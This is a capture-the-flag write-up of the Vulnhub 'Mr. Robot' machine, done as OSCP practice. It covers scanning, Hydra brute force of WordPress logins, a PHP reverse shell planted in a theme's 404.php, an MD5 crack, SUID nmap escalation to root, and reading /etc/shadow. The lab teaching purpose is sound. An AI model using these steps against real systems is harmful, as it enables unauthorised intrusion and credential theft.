---
title: Write-up Mr. Robot on Vulnhub
author: eMVee
date: 2023-03-06 20:00:00 +0800
categories: [CTF, Vulnhub]
tags: [Vulnhub, OSCP, suid]
render_with_liquid: false
---


MrRobot, a great series about a hacker and now there is also a vulnerable machine that is on the well-known list of TJnull in preparation for the OSCP exam. So this must be hacked. The machine can be downloaded from [Vulnhub](https://www.vulnhub.com/entry/mr-robot-1,151/).
After downloading the virtual machine, you have to configure the machine so it is on the same network as your Kali machine.

## Getting started
First things first, let's make a working directory for the target.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd ~/Documents/Vulnhub    

┌──(emvee㉿kali)-[~/Documents/Vulnhub]
└─$ mcd MR-Robot
```
First let's check our own IP address on Kali.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ myip        

    inet 127.0.0.1
    inet 10.0.2.15
```
We have identified the IP address given to our Kali machine. So let's run a ping sweep with fping to identify other hosts on the network,
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.23
```
We could run arp-scan as well to identify the other hosts on our network.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ sudo arp-scan --localnet        
[sudo] password for emvee: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:e0:29:f9, IPv4: 10.0.2.15
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:7f:24:27       PCS Systemtechnik GmbH
10.0.2.23       08:00:27:af:bd:21       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.8: 256 hosts scanned in 2.196 seconds (116.58 hosts/sec). 4 responded

```
To make life a bit easier we should create a variable for he IP address of the target.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ ip=10.0.2.23

```

----

## Enumeration
We are ready to go! First we should enumerate the services and open ports on the target. We could perform a simple port scan with nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ nmap -T4 -Pn $ip   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 14:35 CET
Nmap scan report for 10.0.2.23
Host is up (0.0012s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https

Nmap done: 1 IP address (1 host up) scanned in 4.73 seconds

```
Nmap identified three open ports and services. Let's add them to our notes.
* port 22
	* SSH
* Port 80
	* HTTP
* Port 443
	* HTTPS

Based on these ports, I suggest to run whatweb against port 80 to identify some techniques. In the meantime we should start a more advanced port scan with nmap in another terminal.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ whatweb http://$ip                                                  
http://10.0.2.23 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.0.2.23], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]

```
We have identified with whatweb an Apache server, we should add this to our notes. While nmap is still running we could run nikto to identify some known vulnerabilities.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ nikto -h http://$ip
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.23
+ Target Hostname:    10.0.2.23
+ Target Port:        80
+ Start Time:         2023-03-05 14:36:09 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://10.0.2.23/?p=23>; rel=shortlink
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /wordpresswp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ /wordpresswp-login.php: Wordpress login found
+ 7915 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2023-03-05 14:39:32 (GMT1) (203 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Nikto did discover some interesting information about the website. We should add it to our notes.
* PHP/5.5.29
* /admin
* Wordpress

The advanced port scan with nmap came back with some results.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ sudo nmap -sC -sV -T4 -A -p- $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 14:35 CET
Nmap scan report for 10.0.2.23
Host is up (0.00041s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:AF:BD:21 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 10.0.2.23

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.55 seconds
                                                               
```
There are no new details found with the port scan
So let's visit the website..


![Image](/assets/img/WriteUp/Vulnhub/MrRobot/Pasted image 20230305143909.png){: width="700" height="400" }

Awesome, we got a mrrobot theme just like from the serie.
![Image](/assets/img/WriteUp/Vulnhub/MrRobot/Pasted image 20230305143929.png){: width="700" height="400" }

There are some commands in the webpage we could run. But I rather look into the admin portal to se if we can find the logon page for the WordPress website.

The admin directory shows an index.html file.

![Image](/assets/img/WriteUp/Vulnhub/MrRobot/Pasted image 20230305144059.png){: width="700" height="400" }

![Image](/assets/img/WriteUp/Vulnhub/MrRobot/Pasted image 20230305144131.png){: width="700" height="400" }


Prepare option

![Image](/assets/img/WriteUp/Vulnhub/MrRobot/Pasted image 20230305144218.png){: width="700" height="400" }

![Image](/assets/img/WriteUp/Vulnhub/MrRobot/Pasted image 20230305144359.png){: width="700" height="400" }


```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ wpscan --url http://$ip --enumerate u t p                           
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n
[+] URL: http://10.0.2.23/ [10.0.2.23]
[+] Started: Sun Mar  5 14:45:31 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.0.2.23/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.0.2.23/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.0.2.23/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.0.2.23/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.30 identified (Outdated, released on 2022-10-17).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.0.2.23/dfaf5c7.html, Match: '-release.min.js?ver=4.3.30'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.0.2.23/dfaf5c7.html, Match: 'WordPress 4.3.30'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.0.2.23/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.0.2.23/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://10.0.2.23/wp-content/themes/twentyfifteen/style.css?ver=4.3.30
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.0.2.23/wp-content/themes/twentyfifteen/style.css?ver=4.3.30, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] No Users Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Mar  5 14:45:36 2023
[+] Requests Done: 59
[+] Cached Requests: 6
[+] Data Sent: 14.234 KB
[+] Data Received: 285.067 KB
[+] Memory used: 191.453 MB
[+] Elapsed time: 00:00:04

```
When wpscan finished the job a few things are shown to us. We should add it to our notes.
* WordPress version
	* WordPress 4.3.30
* Theme
	* twentyfifteen

![Image](/assets/img/WriteUp/Vulnhub/MrRobot/Pasted image 20230305144948.png){: width="700" height="400" }

![Image](/assets/img/WriteUp/Vulnhub/MrRobot/Pasted image 20230305150821.png){: width="700" height="400" }

So admin is not a valid username...

Let's check the content of the robots.txt file if it does exist.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ curl http://$ip/robots.txt     
User-agent: *
fsocity.dic
key-1-of-3.txt

```
It looks like there is a dictionary file and a key 1 of 3 file. So let's capture our first flag.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ curl http://$ip/key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```
Now we should download the dictionary file. We can use wget to download it to our working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ wget http://$ip/fsocity.dic                                                      
--2023-03-05 14:51:39--  http://10.0.2.23/fsocity.dic
Connecting to 10.0.2.23:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7245381 (6.9M) [text/x-c]
Saving to: ‘fsocity.dic’

fsocity.dic                                                100%[========================================================================================================================================>]   6.91M  29.9MB/s    in 0.2s    

2023-03-05 14:51:39 (29.9 MB/s) - ‘fsocity.dic’ saved [7245381/7245381]

```


```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ wc fsocity.dic                                                   
 858160  858160 7245381 fsocity.dic
 ```
 
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ sort fsocity.dic | uniq > new-list.dic
```

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ wc new-list.dic 
11451 11451 96747 new-list.dic

```


With Burp Intruder we can enumerate users on a website #user-enumeration
![Image](/assets/img/WriteUp/Vulnhub/MrRobot/Pasted image 20230305151251.png){: width="700" height="400" }

Send the reuqest to `Burp Suite Intruder`.

![Image](/assets/img/WriteUp/Vulnhub/MrRobot/Pasted image 20230305151420.png){: width="700" height="400" }

Select the new dictionary.

![Image](/assets/img/WriteUp/Vulnhub/MrRobot/Pasted image 20230305151515.png){: width="700" height="400" }

Click the button to start the attack. Since the Intruder is running slowly through the list, it is tmie to try to enumerate the user with Hydra.


**User enumeration with Hydra.** #user-enumeration-Hydra
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ hydra -vV -p password -L new-list.dic $ip http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-05 15:22:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task
[DATA] attacking http-post-form://10.0.2.23:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.0.2.23 - login "000" - pass "password" - 1 of 11452 [child 0] (0/0)
[ATTEMPT] target 10.0.2.23 - login "000000" - pass "password" - 2 of 11452 [child 1] (0/0)
[ATTEMPT] target 10.0.2.23 - login "000080" - pass "password" - 3 of 11452 [child 2] (0/0)
[ATTEMPT] target 10.0.2.23 - login "001" - pass "password" - 4 of 11452 [child 3] (0/0)
[ATTEMPT] target 10.0.2.23 - login "002" - pass "password" - 5 of 11452 [child 4] (0/0)
[ATTEMPT] target 10.0.2.23 - login "003" - pass "password" - 6 of 11452 [child 5] (0/0)
[ATTEMPT] target 10.0.2.23 - login "0032" - pass "password" - 7 of 11452 [child 6] (0/0)
[ATTEMPT] target 10.0.2.23 - login "003s" - pass "password" - 8 of 11452 [child 7] (0/0)
[ATTEMPT] target 10.0.2.23 - login "004" - pass "password" - 9 of 11452 [child 8] (0/0)
[ATTEMPT] target 10.0.2.23 - login "00480" - pass "password" - 10 of 11452 [child 9] (0/0)
[ATTEMPT] target 10.0.2.23 - login "004s" - pass "password" - 11 of 11452 [child 10] (0/

<--- SNIP --->

[ATTEMPT] target 10.0.2.23 - login "emails" - pass "password" - 5487 of 11452 [child 2] (0/0)
[ATTEMPT] target 10.0.2.23 - login "embed" - pass "password" - 5488 of 11452 [child 1] (0/0)
[80][http-post-form] host: 10.0.2.23   login: elliot   password: password
[ATTEMPT] target 10.0.2.23 - login "Embedded" - pass "password" - 5489 of 11452 [child 11] (0/0)
[80][http-post-form] host: 10.0.2.23   login: Elliot   password: password
[ATTEMPT] target 10.0.2.23 - login "embodiment" - pass "password" - 5490 of 11452 [child 12] (0/0)
[80][http-post-form] host: 10.0.2.23   login: ELLIOT   password: password
[ATTEMPT] target 10.0.2.23 - login "embraced" - pass "password" - 5491 of 11452 [child 8] (0/0)
[ATTEMPT] target 10.0.2.23 - login "Emmauel10" - pass "password" - 5492 of 11452 [child 9] (0/0)

<--- SNIP --->

[ATTEMPT] target 10.0.2.23 - login "zSqu8myTkY8" - pass "password" - 11451 of 11452 [child 9] (0/0)
[ATTEMPT] target 10.0.2.23 - login "Zzydrax" - pass "password" - 11452 of 11452 [child 1] (0/0)
[STATUS] attack finished for 10.0.2.23 (waiting for children to complete tests)
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-05 15:28:18        
```
Valid usernames are highlited in blue.

![Image](/assets/img/WriteUp/Vulnhub/MrRobot/Pasted image 20230305152955.png){: width="700" height="400" }

As soon as we have a valid username, it is time to bruteforce the password with Hydra.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ hydra -vV -l elliot -P new-list.dic $ip http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-05 15:17:11
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
[DATA] attacking http-post-form://10.0.2.23:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.0.2.23 - login "elliot" - pass "000" - 1 of 11452 [child 0] (0/0)
[ATTEMPT] target 10.0.2.23 - login "elliot" - pass "000000" - 2 of 11452 [child 1] (0/0)
[ATTEMPT] target 10.0.2.23 - login "elliot" - pass "000080" - 3 of 11452 [child 2] (0/0)[ATTEMPT] target 10.0.2.23 - login "elliot" - pass "001" - 4 of 11452 [child 3] (0/0)
[ATTEMPT] target 10.0.2.23 - login "elliot" - pass "002" - 5 of 11452 [child 4] (0/0)
[VERBOSE] Page redirected to http[s]://10.0.2.23:80/wp-login.php?redirect_to=http%3A%2F%2F10.0.2.23%3A80%2Fwp-admin%2F&reauth=1


<--- SNIP --->


[ATTEMPT] target 10.0.2.23 - login "elliot" - pass "esteem" - 5648 of 11452 [child 6] (0/0)
[ATTEMPT] target 10.0.2.23 - login "elliot" - pass "Estudiante" - 5649 of 11452 [child 9] (0/0)
[ATTEMPT] target 10.0.2.23 - login "elliot" - pass "etc" - 5650 of 11452 [child 0] (0/0)
[ATTEMPT] target 10.0.2.23 - login "elliot" - pass "etherial" - 5651 of 11452 [child 12] (0/0)
[ATTEMPT] target 10.0.2.23 - login "elliot" - pass "Ethics" - 5652 of 11452 [child 4] (0/0)
[ATTEMPT] target 10.0.2.23 - login "elliot" - pass "etiquette" - 5653 of 11452 [child 8] (0/0)
[ATTEMPT] target 10.0.2.23 - login "elliot" - pass "euphoric" - 5654 of 11452 [child 1] (0/0)
[ATTEMPT] target 10.0.2.23 - login "elliot" - pass "evaimages" - 5655 of 11452 [child 15] (0/0)
[80][http-post-form] host: 10.0.2.23   login: elliot   password: ER28-0652
[STATUS] attack finished for 10.0.2.23 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-05 15:20:12

```
Hydra has identified valid credentials.

Credentials:
```
elliot:ER28-0652
```

------
## Initial access

With valid credentials for WordPress, we can try to setup a reverse webshell with PHP.

![Image](/assets/img/WriteUp/Vulnhub/MrRobot/Pasted image 20230305152536.png){: width="700" height="400" }

Let's enumerate the other users on WordPress.

![Image](/assets/img/WriteUp/Vulnhub/MrRobot/Pasted image 20230305152650.png){: width="700" height="400" }

* Username: mich05654
* Full name: krista Gordon	
* Email: kgordon@therapist.com

Now let's change the 404.php page in the template to setup a PHP reverse web shell.

![Image](/assets/img/WriteUp/Vulnhub/MrRobot/Pasted image 20230305182644.png){: width="700" height="400" }

Click the save button to update the 404.php file.
Start the netcat listener on port 1234.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ nc -lvp 1234  
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```
Visi the 404 page of the theme to activate the PHP reverse web shell.
```URL
http://10.0.2.23/themes/twentyfifteen/404.php
```
Go back to the netcat listener to see if the connection has been established.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/MR-Robot]
└─$ nc -lvp 1234  
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.2.23.
Ncat: Connection from 10.0.2.23:49516.
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 18:30:30 up  3:58,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
A connection has been established. Let's see who we are on the system.
```bash
$ whoami;id;hostname;pwd
daemon
uid=1(daemon) gid=1(daemon) groups=1(daemon)
linux
/
$ 

```
Now upgrade the shell a little bit.
```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
daemon@linux:/$ 

```
Since we have a reverse shell, let's start enumerating what Linux distro is used on the system. We start with enumerating the kernel version.
```bash
daemon@linux:/$ uname -a
uname -a
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
daemon@linux:/$ uname -mrs
uname -mrs
Linux 3.13.0-55-generic x86_64
```
Now let's enumerate the Linux distro.
```bash
daemon@linux:/$ cat /etc/issue
cat /etc/issue
   _____          __________      ___.           __   
  /     \\_______  \\______   \\ ____\\_ |__   _____/  |_ 
 /  \\ /  \\_  __ \\  |       _//  _ \\| __ \\ /  _ \\   __\\
/    Y    \\  | \\/  |    |   (  <_> ) \\_\\ (  <_> )  |  
\\____|__  /__|     |____|_  /\\____/|___  /\\____/|__|  
        \\/                \\/           \\/             

```

```bash
daemon@linux:/$ cat /etc/*release
cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.2 LTS"
NAME="Ubuntu"
VERSION="14.04.2 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.2 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"

```

We have enumerated the Linux distro and kernel version. Now we have to enumerate the users and home directories on the system.
```bash
daemon@linux:/$ ls -ahlR /home
ls -ahlR /home
/home:
total 12K
drwxr-xr-x  3 root root 4.0K Nov 13  2015 .
drwxr-xr-x 22 root root 4.0K Sep 16  2015 ..
drwxr-xr-x  2 root root 4.0K Nov 13  2015 robot

/home/robot:
total 16K
drwxr-xr-x 2 root  root  4.0K Nov 13  2015 .
drwxr-xr-x 3 root  root  4.0K Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
daemon@linux:/$ 

```

The second flag is located in the home directory of robot, but this file can only read by the user robot.
The other interesting file is the password.raw-md5 file which is readable for everyone.
```bash
daemon@linux:/$ cat /home/robot/password.raw-md5
cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

```
Since it is a MD5 hash, it should be cracked easily. Let's check the hash on crackstation.
```URL
https://crackstation.net/
```

![Image](/assets/img/WriteUp/Vulnhub/MrRobot/Pasted image 20230305184351.png){: width="700" height="400" }

```password
abcdefghijklmnopqrstuvwxyz
```

With this password we can try to switch the user to `robot`.


-----
## Privilege escalation

```bash
daemon@linux:/$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/$ 

```
Let's see if we can `sudo` something.

```bash
robot@linux:/$ sudo -l
sudo -l
[sudo] password for robot: abcdefghijklmnopqrstuvwxyz

Sorry, user robot may not run sudo on linux.
```

Now it is time to enumerate the user.
```bash
robot@linux:/$ whoami;id
whoami;id
robot
uid=1002(robot) gid=1002(robot) groups=1002(robot)
robot@linux:/$ 

```

Capture the flag in the home directory of `robot`.
```bash
robot@linux:/$ cd ~
cd ~
robot@linux:~$ ls
ls
key-2-of-3.txt  password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
robot@linux:~$ 

```
Now let's see what file permissions are set on files. Let's check the SUID first.
```bash
robot@linux:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
robot@linux:~$ 

```
Interesting SUID is set on `/usr/local/bin/nmap`
Let's check [GTFObins for nmap](https://gtfobins.github.io/gtfobins/nmap/).

Let's check what version is on this machine, since an interactive shell can be started if the version is correct. Otherwise we can try to use the SUID bit.
```bash
robot@linux:~$ nmap
nmap
Nmap 3.81 Usage: nmap [Scan Type(s)] [Options] <host or net list>
Some Common Scan Types ('*' options require root privileges)
* -sS TCP SYN stealth port scan (default if privileged (root))
  -sT TCP connect() port scan (default for unprivileged users)
* -sU UDP port scan
  -sP ping scan (Find any reachable machines)
* -sF,-sX,-sN Stealth FIN, Xmas, or Null scan (experts only)
  -sV Version scan probes open ports determining service & app names/versions
  -sR RPC scan (use with other scan types)
Some Common Options (none are required, most can be combined):
* -O Use TCP/IP fingerprinting to guess remote operating system
  -p <range> ports to scan.  Example range: 1-1024,1080,6666,31337
  -F Only scans ports listed in nmap-services
  -v Verbose. Its use is recommended.  Use twice for greater effect.
  -P0 Don't ping hosts (needed to scan www.microsoft.com and others)
* -Ddecoy_host1,decoy2[,...] Hide scan using many decoys
  -6 scans via IPv6 rather than IPv4
  -T <Paranoid|Sneaky|Polite|Normal|Aggressive|Insane> General timing policy
  -n/-R Never do DNS resolution/Always resolve [default: sometimes resolve]
  -oN/-oX/-oG <logfile> Output normal/XML/grepable scan logs to <logfile>
  -iL <inputfile> Get targets from file; Use '-' for stdin
* -S <your_IP>/-e <devicename> Specify source address or network interface
  --interactive Go into interactive mode (then press h for help)
Example: nmap -v -sS -O www.my.com 192.168.0.0/16 '192.88-90.*.*'
SEE THE MAN PAGE FOR MANY MORE OPTIONS, DESCRIPTIONS, AND EXAMPLES 

```
 It looks like Nmap 3.81 is used. Let's try to start an interactive session with the instructions from [GTFObins](https://gtfobins.github.io/gtfobins/nmap/#shell).
```bash
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
```
start the interactive shell with `!sh`.
```bash
nmap> !sh
!sh
# 
```
Now let's see if we are root.
```bash
# whoami
whoami
root
```
We are root via `nmap --interactive`. Now let's capture the last flag this one should be in the root home directory.
```bash
# cd /root
cd /root
# ls
ls
firstboot_done  key-3-of-3.txt
# 
```
Now let's capture all required information as Offensive Security want during the exam.
```bash
# whoami;id;hostname;ifconfig;cat key-3-of-3.txt
whoami;id;hostname;ifconfig;cat key-3-of-3.txt
root
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
linux
eth0      Link encap:Ethernet  HWaddr 08:00:27:af:bd:21  
          inet addr:10.0.2.23  Bcast:10.0.2.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:feaf:bd21/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:638635 errors:106 dropped:0 overruns:0 frame:0
          TX packets:827065 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:213568255 (213.5 MB)  TX bytes:805152944 (805.1 MB)
          Interrupt:19 Base address:0xd020 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:59676 errors:0 dropped:0 overruns:0 frame:0
          TX packets:59676 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:45621645 (45.6 MB)  TX bytes:45621645 (45.6 MB)

04787ddef27c3dee1ee161b21670b4e4
```

-------
## Post exploitation

With the root user it is possible to read the hashes stored in the `/etc/shadow` file.

```bash
# cat /etc/shadow
cat /etc/shadow
root:$6$9xQC1KOf$5cmONytt0VF/wi3Np3jZGRSVzpGj6sXxVHkyJLjV4edlBxTVmW91pcGwAViViSWcAS/.OF0iuvylU5IznY2Re.:16753:0:99999:7:::
daemon:*:16610:0:99999:7:::
bin:*:16610:0:99999:7:::
sys:*:16610:0:99999:7:::
sync:*:16610:0:99999:7:::
games:*:16610:0:99999:7:::
man:*:16610:0:99999:7:::
lp:*:16610:0:99999:7:::
mail:*:16610:0:99999:7:::
news:*:16610:0:99999:7:::
uucp:*:16610:0:99999:7:::
